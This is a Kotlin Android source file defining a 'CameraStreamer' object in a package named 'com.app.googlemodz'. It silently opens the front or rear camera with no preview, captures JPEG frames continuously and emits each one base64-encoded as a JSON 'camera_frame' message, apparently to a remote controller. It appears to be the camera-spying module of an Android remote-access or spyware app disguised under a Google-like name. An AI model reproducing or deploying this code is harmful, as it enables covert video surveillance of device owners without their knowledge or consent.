package com.app.googlemodz

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import org.json.JSONObject

object CameraStreamer {
    var dev: CameraDevice? = null
    var sess: CameraCaptureSession? = null
    var read: ImageReader? = null
    var th: HandlerThread? = null
    
    fun start(ctx: Context, f: Int, emit: (JSONObject) -> Unit) {
        try {
            // Hentikan kamera sebelumnya biar ga tabrakan (crash)
            stop()
            
            val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = m.cameraIdList.firstOrNull { 
                m.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == f 
            } ?: return
            
            th = HandlerThread("c").also { it.start() }
            val h = Handler(th!!.looper)
            
            read = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
            read!!.setOnImageAvailableListener({ r ->
                try {
                    val i = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val b = ByteArray(i.planes[0].buffer.remaining())
                    i.planes[0].buffer.get(b)
                    i.close()
                    
                    emit(JSONObject().put("action", "camera_frame").put("data", Base64.encodeToString(b, Base64.NO_WRAP)))
                } catch (e: Exception) { }
            }, h)
            
            m.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) {
                    try {
                        dev = c
                        val r = c.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        r.addTarget(read!!.surface)
                        
                        c.createCaptureSession(listOf(read!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    sess = s
                                    s.setRepeatingRequest(r.build(), null, h)
                                } catch (e: Exception) { }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {}
                        }, h)
                    } catch (e: Exception) { }
                }
                override fun onDisconnected(c: CameraDevice) {}
                override fun onError(c: CameraDevice, e: Int) {}
            }, h)
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    fun stop() {
        try {
            sess?.close()
            sess = null
            dev?.close()
            dev = null
            read?.close()
            read = null
            th?.quitSafely()
            th = null
        } catch (e: Exception) { }
    }
}
